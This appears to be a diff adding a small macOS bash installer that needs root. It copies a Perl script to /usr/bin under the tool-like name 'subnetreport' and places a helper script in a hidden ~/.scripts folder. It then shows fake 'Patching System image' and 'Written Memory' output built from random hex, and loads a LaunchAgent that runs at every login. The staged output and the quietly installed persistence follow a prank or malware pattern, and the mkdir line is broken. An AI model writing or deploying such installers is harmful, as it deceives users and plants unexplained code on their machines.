@@ -1,0 +1,18 @@
+#!/bin/bash
+if [ "$EUID" -ne 0 ]
+	then echo "Script must be run as root"
+	exit
+fi
+mkdir  /Users/"$(whoami)"/.scripts/helper/t1.sh
+cp script.pl /usr/bin/subnetreport  && chmod +x /usr/bin/subnetreport
+cp helper/t1.sh /Users/"$(whoami)"/.scripts/helper/t1.sh
+echo "Processing Memory..." && sleep 3
+echo "Patching System image..." && sleep 4
+echo "Written Memory:" && head -c 65536 /dev/random | hexdump | tail -41 | head -n40 >> temp
+for i in {1..10}
+do
+head -$i temp && sleep 0.5
+done
+cp helper/say.plist ~/Library/LaunchAgents/com.tyler.loginscript.plist
+launchctl load ~/Library/LaunchAgents/com.tyler.loginscript.plist
+
